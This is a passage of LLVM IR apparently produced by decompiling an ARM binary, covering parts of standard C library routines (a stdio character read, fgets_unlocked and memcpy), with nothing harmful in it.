  br i1 %v2_169e4, label %dec_label_pc_16a10, label %dec_label_pc_169ec

dec_label_pc_169ec:                               ; preds = %dec_label_pc_169e0
  %tmp26 = urem i16 %v2_169e0, 2
  %v1_169ec = zext i16 %tmp26 to i32
  %tmp22 = sub nsw i32 0, %v1_169ec
  %v4_169f0 = and i32 %tmp22, 4
  %v5_169f0 = add i32 %v4_169f0, %v2_16a20
  %v1_169f4 = add i32 %v5_169f0, 36
  %v2_169f4 = inttoptr i32 %v1_169f4 to i8*
  %v3_169f4 = load i8, i8* %v2_169f4, align 1
  %v4_169f4 = zext i8 %v3_169f4 to i32
  %v1_169f8 = add nsw i32 %v3_169e0, -1
  store i32 %v1_169f8, i32* %r2.global-to-local, align 4
  store i32 %v4_169f4, i32* %r0.global-to-local, align 4
  %v2_16a04 = add i32 %v2_16a20, 40
  %v3_16a04 = inttoptr i32 %v2_16a04 to i32*
  store i32 0, i32* %v3_16a04, align 4
  %v0_16a08 = load i32, i32* %r2.global-to-local, align 4
  %v1_16a08 = trunc i32 %v0_16a08 to i16
  %v2_16a08 = load i32, i32* @r4, align 4
  %v3_16a08 = inttoptr i32 %v2_16a08 to i16*
  store i16 %v1_16a08, i16* %v3_16a08, align 2
  br label %dec_label_pc_16aac

dec_label_pc_16a10:                               ; preds = %dec_label_pc_169e0
  %v1_16a10 = add i32 %v2_16a20, 16
  %v1_16a14 = inttoptr i32 %v1_16a10 to i32*
  %v2_16a14 = load i32, i32* %v1_16a14, align 4
  store i32 %v2_16a14, i32* @r1, align 4
  %v3_16a14 = add i32 %v2_16a20, 20
  %v4_16a14 = inttoptr i32 %v3_16a14 to i32*
  %v5_16a14 = load i32, i32* %v4_16a14, align 4
  %v9_16a18 = icmp eq i32 %v5_16a14, %v2_16a14
  br i1 %v9_16a18, label %dec_label_pc_16a28, label %.thread4

.thread4:                                         ; preds = %dec_label_pc_16a10
  %v2_16a1c = inttoptr i32 %v2_16a14 to i8*
  %v3_16a1c = load i8, i8* %v2_16a1c, align 1
  %v4_16a1c = zext i8 %v3_16a1c to i32
  store i32 %v4_16a1c, i32* %r0.global-to-local, align 4
  %v6_16a1c = add i32 %v2_16a14, 1
  store i32 %v6_16a1c, i32* @r1, align 4
  store i32 %v6_16a1c, i32* %v1_16a14, align 4
  br label %dec_label_pc_16aac

dec_label_pc_16a28:                               ; preds = %dec_label_pc_16a10
  %v1_16a28 = add i32 %v2_16a20, 4
  %v2_16a28 = inttoptr i32 %v1_16a28 to i32*
  %v3_16a28 = load i32, i32* %v2_16a28, align 4
  %v7_16a2c = icmp eq i32 %v3_16a28, -2
  br i1 %v7_16a2c, label %.thread7, label %dec_label_pc_16a40

.thread7:                                         ; preds = %dec_label_pc_16a28
  %v2_16a30 = or i16 %v2_169e0, 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i16 %v2_16a30, i16* %v1_169e0, align 2
  br label %dec_label_pc_16aac

dec_label_pc_16a40:                               ; preds = %dec_label_pc_16a28
  %v1_16a40 = and i32 %v3_169e0, 768
  %v2_16a40 = icmp eq i32 %v1_16a40, 0
  br i1 %v2_16a40, label %.thread9, label %bb23

bb23:                                             ; preds = %dec_label_pc_16a40
  %v1_16a48 = load i32, i32* @r5, align 4
  %v3_16a48 = add i32 %v1_16a48, 76
  %v4_16a48 = inttoptr i32 %v3_16a48 to i32*
  %v5_16a48 = load i32, i32* %v4_16a48, align 4
  store i32 %v5_16a48, i32* %r0.global-to-local, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_16a40, %bb23
  store i32 92752, i32* @lr, align 4
  %v1_16a4c = xor i1 %v2_16a40, true
  call void @__pseudo_cond_branch(i1 %v1_16a4c, i32 ptrtoint (i32* @global_var_165e8.603 to i32))
  %v0_16a50 = load i32, i32* @r4, align 4
  %v1_16a50 = add i32 %v0_16a50, 8
  store i32 %v1_16a50, i32* %r2.global-to-local, align 4
  %v1_16a54 = inttoptr i32 %v1_16a50 to i32*
  %v2_16a54 = load i32, i32* %v1_16a54, align 4
  store i32 %v2_16a54, i32* %r2.global-to-local, align 4
  %v3_16a54 = add i32 %v0_16a50, 12
  %v4_16a54 = inttoptr i32 %v3_16a54 to i32*
  %v5_16a54 = load i32, i32* %v4_16a54, align 4
  %v9_16a58 = icmp eq i32 %v5_16a54, %v2_16a54
  br i1 %v9_16a58, label %dec_label_pc_16a8c, label %dec_label_pc_16a60

dec_label_pc_16a60:                               ; preds = %.thread9
  %v2_16a60 = add i32 %v0_16a50, 24
  %v3_16a60 = inttoptr i32 %v2_16a60 to i32*
  store i32 %v2_16a54, i32* %v3_16a60, align 4
  %v0_16a64 = load i32, i32* @r4, align 4
  store i32 %v0_16a64, i32* %r0.global-to-local, align 4
  %v2_16a68 = call i32 @__stdio_rfill(i32 %v0_16a64)
  store i32 %v2_16a68, i32* %r0.global-to-local, align 4
  %v2_16a6c = icmp eq i32 %v2_16a68, 0
  br i1 %v2_16a6c, label %dec_label_pc_16aa8, label %dec_label_pc_16a74

dec_label_pc_16a74:                               ; preds = %dec_label_pc_16a60
  %v0_16a74 = load i32, i32* @r4, align 4
  %v1_16a74 = add i32 %v0_16a74, 20
  %v2_16a74 = inttoptr i32 %v1_16a74 to i32*
  %v3_16a74 = load i32, i32* %v2_16a74, align 4
  %v2_16a78 = add i32 %v0_16a74, 24
  %v3_16a78 = inttoptr i32 %v2_16a78 to i32*
  store i32 %v3_16a74, i32* %v3_16a78, align 4
  %v0_16a7c = load i32, i32* @r4, align 4
  %v1_16a7c = add i32 %v0_16a7c, 16
  %v2_16a7c = inttoptr i32 %v1_16a7c to i32*
  %v3_16a7c = load i32, i32* %v2_16a7c, align 4
  %v1_16a80 = inttoptr i32 %v3_16a7c to i8*
  %v2_16a80 = load i8, i8* %v1_16a80, align 1
  %v3_16a80 = zext i8 %v2_16a80 to i32
  store i32 %v3_16a80, i32* %r0.global-to-local, align 4
  %v5_16a80 = add i32 %v3_16a7c, 1
  store i32 %v5_16a80, i32* %v2_16a7c, align 4
  br label %dec_label_pc_16aac

dec_label_pc_16a8c:                               ; preds = %.thread9
  %v1_16a8c = inttoptr i32 %v0_16a50 to i16*
  store i32 %v0_16a50, i32* %r0.global-to-local, align 4
  %v2_16a90 = ptrtoint i8* %stack_var_-17 to i32
  store i32 %v2_16a90, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v5_16a98 = call i32 @__stdio_READ(i16* %v1_16a8c, i32 %v2_16a90, i32 1)
  store i32 %v5_16a98, i32* %r0.global-to-local, align 4
  %v2_16a9c = icmp eq i32 %v5_16a98, 0
  br i1 %v2_16a9c, label %dec_label_pc_16aa8, label %bb24

bb24:                                             ; preds = %dec_label_pc_16a8c
  %v4_16aa0 = load i8, i8* %stack_var_-17, align 1
  %v5_16aa0 = sext i8 %v4_16aa0 to i32
  store i32 %v5_16aa0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16aac

dec_label_pc_16aa8:                               ; preds = %dec_label_pc_16a8c, %dec_label_pc_169d0, %dec_label_pc_16a60
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16aac

dec_label_pc_16aac:                               ; preds = %bb, %.thread7, %bb24, %.thread4, %dec_label_pc_16a74, %dec_label_pc_169ec, %dec_label_pc_16aa8
  %v2_16ab0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_16ab0, i32* @r4, align 4
  store i32 %v6_16994, i32* @r5, align 4
  store i32 %v9_16994, i32* @lr, align 4
  %v1_16ab4 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16ab4

; uselistorder directives
  uselistorder i32 %v2_16a14, { 1, 0, 2, 3 }
  uselistorder i32 %v2_16a20, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 %v3_16998, { 1, 0, 2, 3 }
  uselistorder i8* %stack_var_-17, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 12, 0, 1, 4, 2, 3, 6, 5, 7, 8, 9, 10, 11, 13 }
  uselistorder i32 768, { 2, 0, 3, 1, 4 }
  uselistorder label %dec_label_pc_16aac, { 6, 2, 4, 1, 3, 5, 0 }
  uselistorder label %dec_label_pc_16aa8, { 0, 2, 1 }
  uselistorder label %.thread9, { 1, 0 }
}

define i32 @__GI_fgets_unlocked(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v9_16ac0 = load i32, i32* @r6, align 4
  %v12_16ac0 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_16ac4 = icmp eq i32 %arg2, 0
  store i1 %v2_16ac4, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r7, align 4
  store i32 %arg3, i32* @r4, align 4
  %tmp22 = icmp slt i32 %arg2, 1
  br i1 %tmp22, label %dec_label_pc_16b4c, label %dec_label_pc_16b34.preheader

dec_label_pc_16b34.preheader:                     ; preds = %entry
  store i32 %tmp, i32* @r5, align 4
  %v1_16b342 = add i32 %arg2, -1
  store i32 %v1_16b342, i32* @r6, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v7_16b348 = icmp eq i32 %arg2, 1
  store i1 %v7_16b348, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b348, label %dec_label_pc_16b3c, label %dec_label_pc_16ae0

dec_label_pc_16ae0:                               ; preds = %dec_label_pc_16b34.preheader, %dec_label_pc_16b34.backedge.dec_label_pc_16ae0_crit_edge
  %v0_16b04 = phi i32 [ %v0_16ae0.pre, %dec_label_pc_16b34.backedge.dec_label_pc_16ae0_crit_edge ], [ %arg3, %dec_label_pc_16b34.preheader ]
  %v1_16ae0 = add i32 %v0_16b04, 16
  %v2_16ae0 = inttoptr i32 %v1_16ae0 to i32*
  %v3_16ae0 = load i32, i32* %v2_16ae0, align 4
  store i32 %v3_16ae0, i32* %r2.global-to-local, align 4
  %v1_16ae4 = add i32 %v0_16b04, 24
  %v2_16ae4 = inttoptr i32 %v1_16ae4 to i32*
  %v3_16ae4 = load i32, i32* %v2_16ae4, align 4
  store i32 %v3_16ae4, i32* %r3.global-to-local, align 4
  %v3_16ae8 = icmp uge i32 %v3_16ae0, %v3_16ae4
  store i1 %v3_16ae8, i1* %cpsr_c.global-to-local, align 1
  %v9_16ae8 = icmp eq i32 %v3_16ae0, %v3_16ae4
  store i1 %v9_16ae8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16ae8, label %dec_label_pc_16b04, label %dec_label_pc_16af0

dec_label_pc_16af0:                               ; preds = %dec_label_pc_16ae0
  %v1_16af0 = inttoptr i32 %v3_16ae0 to i8*
  %v2_16af0 = load i8, i8* %v1_16af0, align 1
  %v3_16af0 = zext i8 %v2_16af0 to i32
  store i32 %v3_16af0, i32* %r3.global-to-local, align 4
  %v5_16af0 = add i32 %v3_16ae0, 1
  store i32 %v5_16af0, i32* %r2.global-to-local, align 4
  %v2_16af4 = load i32, i32* @r5, align 4
  %v3_16af4 = inttoptr i32 %v2_16af4 to i8*
  store i8 %v2_16af0, i8* %v3_16af4, align 1
  %v4_16af4 = load i32, i32* @r5, align 4
  %v5_16af4 = add i32 %v4_16af4, 1
  store i32 %v5_16af4, i32* @r5, align 4
  %v0_16af8 = load i32, i32* %r3.global-to-local, align 4
  %v2_16af8 = icmp ugt i32 %v0_16af8, 9
  store i1 %v2_16af8, i1* %cpsr_c.global-to-local, align 1
  %v7_16af8 = icmp eq i32 %v0_16af8, 10
  store i1 %v7_16af8, i1* %cpsr_z.global-to-local, align 1
  %v0_16afc = load i32, i32* %r2.global-to-local, align 4
  %v1_16afc = load i32, i32* @r4, align 4
  %v2_16afc = add i32 %v1_16afc, 16
  %v3_16afc = inttoptr i32 %v2_16afc to i32*
  store i32 %v0_16afc, i32* %v3_16afc, align 4
  br i1 %v7_16af8, label %dec_label_pc_16b3c, label %dec_label_pc_16b34.backedge

dec_label_pc_16b04:                               ; preds = %dec_label_pc_16ae0
  %v1_16b04 = inttoptr i32 %v0_16b04 to i16*
  %v3_16b08 = call i32 @getc_unlocked(i16* %v1_16b04)
  %v3_16b0c = icmp eq i32 %v3_16b08, -1
  store i1 %v3_16b0c, i1* %cpsr_c.global-to-local, align 1
  %v8_16b0c = icmp eq i32 %v3_16b08, -1
  store i1 %v8_16b0c, i1* %cpsr_z.global-to-local, align 1
  %v1_16b10 = urem i32 %v3_16b08, 256
  store i32 %v1_16b10, i32* %r3.global-to-local, align 4
  br i1 %v3_16b0c, label %dec_label_pc_16b18, label %dec_label_pc_16b30

dec_label_pc_16b18:                               ; preds = %dec_label_pc_16b04
  %v0_16b18 = load i32, i32* @r4, align 4
  %v1_16b18 = inttoptr i32 %v0_16b18 to i16*
  %v2_16b18 = load i16, i16* %v1_16b18, align 2
  %v3_16b18 = zext i16 %v2_16b18 to i32
  store i32 %v3_16b18, i32* %r3.global-to-local, align 4
  %v1_16b1c = and i32 %v3_16b18, 8
  %v2_16b1c = icmp eq i32 %v1_16b1c, 0
  store i1 %v2_16b1c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b1c, label %dec_label_pc_16b3c, label %dec_label_pc_16b4c

dec_label_pc_16b30:                               ; preds = %dec_label_pc_16b04
  %v1_16b28 = trunc i32 %v3_16b08 to i8
  %v2_16b28 = load i32, i32* @r5, align 4
  %v3_16b28 = inttoptr i32 %v2_16b28 to i8*
  store i8 %v1_16b28, i8* %v3_16b28, align 1
  %v4_16b28 = load i32, i32* @r5, align 4
  %v5_16b28 = add i32 %v4_16b28, 1
  store i32 %v5_16b28, i32* @r5, align 4
  %v0_16b2c = load i32, i32* %r3.global-to-local, align 4
  %v2_16b2c = icmp ugt i32 %v0_16b2c, 9
  store i1 %v2_16b2c, i1* %cpsr_c.global-to-local, align 1
  %v7_16b2c = icmp eq i32 %v0_16b2c, 10
  store i1 %v7_16b2c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b2c, label %dec_label_pc_16b3c, label %dec_label_pc_16b34.backedge

dec_label_pc_16b34.backedge:                      ; preds = %dec_label_pc_16b30, %dec_label_pc_16af0
  %v0_16b34 = load i32, i32* @r6, align 4
  %v1_16b34 = add i32 %v0_16b34, -1
  store i32 %v1_16b34, i32* @r6, align 4
  %v2_16b34 = icmp ne i32 %v0_16b34, 0
  store i1 %v2_16b34, i1* %cpsr_c.global-to-local, align 1
  %v7_16b34 = icmp eq i32 %v0_16b34, 1
  store i1 %v7_16b34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_16b34, label %dec_label_pc_16b3c, label %dec_label_pc_16b34.backedge.dec_label_pc_16ae0_crit_edge

dec_label_pc_16b34.backedge.dec_label_pc_16ae0_crit_edge: ; preds = %dec_label_pc_16b34.backedge
  %v0_16ae0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_16ae0

dec_label_pc_16b3c:                               ; preds = %dec_label_pc_16b30, %dec_label_pc_16b34.backedge, %dec_label_pc_16af0, %dec_label_pc_16b34.preheader, %dec_label_pc_16b18
  %v0_16b3c = load i32, i32* @r5, align 4
  %v1_16b3c = load i32, i32* @r7, align 4
  %v3_16b3c = icmp uge i32 %v0_16b3c, %v1_16b3c
  store i1 %v3_16b3c, i1* %cpsr_c.global-to-local, align 1
  %v9_16b3c = icmp eq i32 %v0_16b3c, %v1_16b3c
  store i1 %v9_16b3c, i1* %cpsr_z.global-to-local, align 1
  %v2_16b40 = xor i1 %v9_16b3c, true
  %v3_16b40 = and i1 %v3_16b3c, %v2_16b40
  br i1 %v3_16b40, label %bb, label %.thread14

bb:                                               ; preds = %dec_label_pc_16b3c
  store i32 0, i32* %r3.global-to-local, align 4
  %v7_16b44 = inttoptr i32 %v0_16b3c to i8*
  store i8 0, i8* %v7_16b44, align 1
  %v0_16b48.pre = load i1, i1* %cpsr_c.global-to-local, align 1
  %v1_16b48.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_16b3c, %bb
  %v1_16b48 = phi i1 [ %v1_16b48.pre, %bb ], [ %v9_16b3c, %dec_label_pc_16b3c ]
  %v0_16b48 = phi i1 [ %v0_16b48.pre, %bb ], [ %v3_16b3c, %dec_label_pc_16b3c ]
  %v2_16b48 = xor i1 %v1_16b48, true
  %v3_16b48 = and i1 %v0_16b48, %v2_16b48
  br i1 %v3_16b48, label %.dec_label_pc_16b50_crit_edge, label %dec_label_pc_16b4c

.dec_label_pc_16b50_crit_edge:                    ; preds = %.thread14
  %v0_16b50.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_16b50

dec_label_pc_16b4c:                               ; preds = %entry, %dec_label_pc_16b18, %.thread14
  br label %dec_label_pc_16b50

dec_label_pc_16b50:                               ; preds = %.dec_label_pc_16b50_crit_edge, %dec_label_pc_16b4c
  %v0_16b50 = phi i32 [ %v0_16b50.pre, %.dec_label_pc_16b50_crit_edge ], [ 0, %dec_label_pc_16b4c ]
  store i32 %v9_16ac0, i32* @r6, align 4
  store i32 %v12_16ac0, i32* @r7, align 4
  ret i32 %v0_16b50

; uselistorder directives
  uselistorder i1 %v9_16b3c, { 1, 0, 2 }
  uselistorder i32 %v1_16b3c, { 1, 0 }
  uselistorder i32 %v0_16b3c, { 0, 2, 1 }
  uselistorder i32 %v0_16b34, { 2, 0, 1 }
  uselistorder i32 %v0_16b2c, { 1, 0 }
  uselistorder i32 %v3_16b08, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16af8, { 1, 0 }
  uselistorder i32 %v3_16ae0, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_16b04, { 0, 2, 1 }
  uselistorder i32* %r3.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 7, 2, 3, 4, 5, 6, 9, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 6, 2, 3, 4, 5, 8, 7 }
  uselistorder i32 %arg2, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_16b50, { 1, 0 }
  uselistorder label %dec_label_pc_16b4c, { 2, 1, 0 }
  uselistorder label %.thread14, { 1, 0 }
  uselistorder label %dec_label_pc_16b3c, { 1, 0, 4, 2, 3 }
  uselistorder label %dec_label_pc_16ae0, { 1, 0 }
}

define i32 @_memcpy() local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_16b60 = load i32, i32* @r1, align 4
  %v1_16b60 = load i32, i32* @r0, align 4
  %v2_16b60 = sub i32 %v0_16b60, %v1_16b60
  %v3_16b60 = icmp ult i32 %v0_16b60, %v1_16b60
  %v4_16b60 = xor i32 %v1_16b60, %v0_16b60
  %v5_16b60 = xor i32 %v2_16b60, %v0_16b60
  %v6_16b60 = and i32 %v5_16b60, %v4_16b60
  %v7_16b60 = icmp slt i32 %v6_16b60, 0
  store i1 %v7_16b60, i1* %cpsr_v.global-to-local, align 1
  %v8_16b60 = icmp slt i32 %v2_16b60, 0
  store i1 %v8_16b60, i1* %cpsr_n.global-to-local, align 1
  %v9_16b60 = icmp eq i32 %v0_16b60, %v1_16b60
  store i1 %v9_16b60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_16b60, label %dec_label_pc_16db4, label %dec_label_pc_16b68

dec_label_pc_16b68:                               ; preds = %entry
  br i1 %v9_16b60, label %.thread130, label %bb

.thread130:                                       ; preds = %bb153, %.thread129, %bb150, %dec_label_pc_16b68
  %merge = phi i32 [ %v0_16b60, %dec_label_pc_16b68 ], [ %v2_16e48, %bb150 ], [ %v11_16e64, %bb153 ], [ %v7_16e64, %.thread129 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_16b68
  %v5_16b6c = inttoptr i32 %v1_16b60 to i8*
  store i8* %v5_16b6c, i8** %stack_var_-8, align 4
  %v8_16b6c = load i32, i32* @lr, align 4
  %v0_16b70 = load i32, i32* @r2, align 4
  %v2_16b70 = add i32 %v0_16b70, -4
  store i32 %v2_16b70, i32* %r2.global-to-local, align 4
  %v4_16b70 = sub i32 3, %v0_16b70
  %v5_16b70 = and i32 %v4_16b70, %v0_16b70
  %v6_16b70 = icmp slt i32 %v5_16b70, 0
  store i1 %v6_16b70, i1* %cpsr_v.global-to-local, align 1
  %v7_16b70 = icmp slt i32 %v2_16b70, 0
  store i1 %v7_16b70, i1* %cpsr_n.global-to-local, align 1
  %v8_16b70 = icmp eq i32 %v0_16b70, 4
  store i1 %v8_16b70, i1* %cpsr_z.global-to-local, align 1
  %v5_16b74 = icmp slt i32 %v0_16b70, 4
  br i1 %v5_16b74, label %bb140, label %dec_label_pc_16b78

dec_label_pc_16b78:                               ; preds = %bb
  %v1_16b78 = urem i32 %v1_16b60, 4
  store i32 %v1_16b78, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b78 = icmp eq i32 %v1_16b78, 0
  store i1 %v2_16b78, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16b78, label %dec_label_pc_16b80, label %dec_label_pc_16c2c

dec_label_pc_16b80:                               ; preds = %dec_label_pc_16b78
  %v1_16b80 = urem i32 %v0_16b60, 4
  store i32 %v1_16b80, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_16b80 = icmp eq i32 %v1_16b80, 0
  store i1 %v2_16b80, i1* %cpsr_z.global-to-local, align 1
  %extract.t = trunc i32 %v0_16b60 to i2
  br i1 %v2_16b80, label %dec_label_pc_16b88, label %dec_label_pc_16c5c

dec_label_pc_16b88:                               ; preds = %dec_label_pc_16b80, %dec_label_pc_16c54
  %v0_16ba094 = phi i32 [ %v1_16b60, %dec_label_pc_16b80 ], [ %v0_16d7c77, %dec_label_pc_16c54 ]
  %v0_16b9c93 = phi i32 [ %v0_16b60, %dec_label_pc_16b80 ], [ %v0_16c54, %dec_label_pc_16c54 ]
  %v0_16b88 = phi i32 [ %v2_16b70, %dec_label_pc_16b80 ], [ %v2_16c4c, %dec_label_pc_16c54 ]
  %v1_16b88 = add i32 %v0_16b88, -8
  store i32 %v1_16b88, i32* %r2.global-to-local, align 4
  %v3_16b88 = sub i32 7, %v0_16b88
  %v4_16b88 = and i32 %v3_16b88, %v0_16b88
  %v5_16b88 = icmp slt i32 %v4_16b88, 0
  store i1 %v5_16b88, i1* %cpsr_v.global-to-local, align 1
  %v6_16b88 = icmp slt i32 %v1_16b88, 0
  store i1 %v6_16b88, i1* %cpsr_n.global-to-local, align 1
  %v7_16b88 = icmp eq i32 %v0_16b88, 8
  store i1 %v7_16b88, i1* %cpsr_z.global-to-local, align 1
  %v2_16b8c = xor i1 %v6_16b88, %v5_16b88
  br i1 %v2_16b8c, label %dec_label_pc_16bdc, label %dec_label_pc_16b90

dec_label_pc_16b90:                               ; preds = %dec_label_pc_16b88
  %v1_16b90 = add i32 %v0_16b88, -28
  store i32 %v1_16b90, i32* %r2.global-to-local, align 4
  %v3_16b90 = sub i32 27, %v0_16b88
  %v4_16b90 = and i32 %v3_16b90, %v1_16b88
  %v5_16b90 = icmp slt i32 %v4_16b90, 0
  store i1 %v5_16b90, i1* %cpsr_v.global-to-local, align 1
  %v6_16b90 = icmp slt i32 %v1_16b90, 0
  store i1 %v6_16b90, i1* %cpsr_n.global-to-local, align 1
  %v7_16b90 = icmp eq i32 %v1_16b88, 20
  store i1 %v7_16b90, i1* %cpsr_z.global-to-local, align 1
  %v2_16b94 = xor i1 %v6_16b90, %v5_16b90
  br i1 %v2_16b94, label %dec_label_pc_16bc8, label %dec_label_pc_16b98

dec_label_pc_16b98:                               ; preds = %dec_label_pc_16b90
  %v0_16b98 = load i32, i32* @r4, align 4
  store i32 %v0_16b98, i32* %stack_var_-12, align 4
  br label %dec_label_pc_16b9c

dec_label_pc_16b9c:                               ; preds = %dec_label_pc_16b9c.dec_label_pc_16b9c_crit_edge, %dec_label_pc_16b98
  %v0_16ba0 = phi i32 [ %v12_16ba8, %dec_label_pc_16b9c.dec_label_pc_16b9c_crit_edge ], [ %v0_16ba094, %dec_label_pc_16b98 ]
  %v0_16b9c = phi i32 [ %v0_16b9c.pre, %dec_label_pc_16b9c.dec_label_pc_16b9c_crit_edge ], [ %v0_16b9c93, %dec_label_pc_16b98 ]
  %v1_16b9c = inttoptr i32 %v0_16b9c to i32*
  %v2_16b9c = load i32, i32* %v1_16b9c, align 4
  %v3_16b9c = add i32 %v0_16b9c, 4
  %v4_16b9c = inttoptr i32 %v3_16b9c to i32*
  %v5_16b9c = load i32, i32* %v4_16b9c, align 4
  store i32 %v5_16b9c, i32* %r4.global-to-local, align 4
  %v6_16b9c = add i32 %v0_16b9c, 8
  %v7_16b9c = inttoptr i32 %v6_16b9c to i32*
  %v8_16b9c = load i32, i32* %v7_16b9c, align 4
  store i32 %v8_16b9c, i32* %ip.global-to-local, align 4
  %v9_16b9c = add i32 %v0_16b9c, 12
  %v10_16b9c = inttoptr i32 %v9_16b9c to i32*
  %v11_16b9c = load i32, i32* %v10_16b9c, align 4
  store i32 %v11_16b9c, i32* %lr.global-to-local, align 4
  %v12_16b9c = add i32 %v0_16b9c, 16
  store i32 %v12_16b9c, i32* %r1.global-to-local, align 4
  %v1_16ba0 = inttoptr i32 %v0_16ba0 to i32*
  store i32 %v2_16b9c, i32* %v1_16ba0, align 4
  %v3_16ba0 = add i32 %v0_16ba0, 4
  %v4_16ba0 = inttoptr i32 %v3_16ba0 to i32*
  %v5_16ba0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16ba0, i32* %v4_16ba0, align 4
  %v6_16ba0 = add i32 %v0_16ba0, 8
  %v7_16ba0 = inttoptr i32 %v6_16ba0 to i32*
  %v8_16ba0 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_16ba0, i32* %v7_16ba0, align 4
  %v9_16ba0 = add i32 %v0_16ba0, 12
  %v10_16ba0 = inttoptr i32 %v9_16ba0 to i32*
  %v11_16ba0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16ba0, i32* %v10_16ba0, align 4
  %v12_16ba0 = add i32 %v0_16ba0, 16
  store i32 %v12_16ba0, i32* %r0.global-to-local, align 4
  %v0_16ba4 = load i32, i32* %r1.global-to-local, align 4
  %v1_16ba4 = inttoptr i32 %v0_16ba4 to i32*
  %v2_16ba4 = load i32, i32* %v1_16ba4, align 4
  store i32 %v2_16ba4, i32* @r3, align 4
  %v3_16ba4 = add i32 %v0_16ba4, 4
  %v4_16ba4 = inttoptr i32 %v3_16ba4 to i32*
  %v5_16ba4 = load i32, i32* %v4_16ba4, align 4
  store i32 %v5_16ba4, i32* %r4.global-to-local, align 4
  %v6_16ba4 = add i32 %v0_16ba4, 8
  %v7_16ba4 = inttoptr i32 %v6_16ba4 to i32*
  %v8_16ba4 = load i32, i32* %v7_16ba4, align 4
  store i32 %v8_16ba4, i32* @ip, align 4
  %v9_16ba4 = add i32 %v0_16ba4, 12
  %v10_16ba4 = inttoptr i32 %v9_16ba4 to i32*
  %v11_16ba4 = load i32, i32* %v10_16ba4, align 4
  store i32 %v11_16ba4, i32* %lr.global-to-local, align 4
  %v12_16ba4 = add i32 %v0_16ba4, 16
  store i32 %v12_16ba4, i32* @r1, align 4
  %v1_16ba8 = inttoptr i32 %v12_16ba0 to i32*
  store i32 %v2_16ba4, i32* %v1_16ba8, align 4
  %v3_16ba8 = add i32 %v0_16ba0, 20
  %v4_16ba8 = inttoptr i32 %v3_16ba8 to i32*
  %v5_16ba8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_16ba8, i32* %v4_16ba8, align 4
  %v6_16ba8 = add i32 %v0_16ba0, 24
  %v7_16ba8 = inttoptr i32 %v6_16ba8 to i32*
  %v8_16ba8 = load i32, i32* @ip, align 4
  store i32 %v8_16ba8, i32* %v7_16ba8, align 4
  %v9_16ba8 = add i32 %v0_16ba0, 28
  %v10_16ba8 = inttoptr i32 %v9_16ba8 to i32*
  %v11_16ba8 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_16ba8, i32* %v10_16ba8, align 4
  %v12_16ba8 = add i32 %v0_16ba0, 32
  store i32 %v12_16ba8, i32* @r0, align 4
  %v0_16bac = load i32, i32* %r2.global-to-local, align 4
  %v1_16bac = add i32 %v0_16bac, -32
  store i32 %v1_16bac, i32* %r2.global-to-local, align 4
  %v3_16bac = sub i32 31, %v0_16bac
  %v4_16bac = and i32 %v3_16bac, %v0_16bac
  %v5_16bac = icmp slt i32 %v4_16bac, 0
  %v6_16bac = icmp slt i32 %v1_16bac, 0
  %v2_16bb0 = xor i1 %v6_16bac, %v5_16bac
  br i1 %v2_16bb0, label %dec_label_pc_16bb4, label %dec_label_pc_16b9c.dec_label_pc_16b9c_crit_edge

dec_label_pc_16b9c.dec_label_pc_16b9c_crit_edge:  ; preds = %dec_label_pc_16b9c
  %v0_16b9c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_16b9c

